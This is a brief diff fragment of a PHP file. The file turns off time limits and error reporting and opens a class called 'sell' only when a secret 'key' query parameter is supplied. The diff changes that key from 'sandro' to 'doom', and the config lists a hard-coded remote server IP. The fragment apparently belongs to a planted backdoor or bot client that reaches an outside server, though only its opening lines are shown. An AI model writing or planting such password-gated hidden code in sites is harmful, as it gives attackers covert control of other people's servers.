@@ -2,7 +2,7 @@
 set_time_limit(0);
 error_reporting(0);
 
-if(isset($_GET['key']) == "sandro") {
+if(isset($_GET['key']) == "doom") {
     class sell {
         var $config = array(
 					'server' => '213.153.68.5',
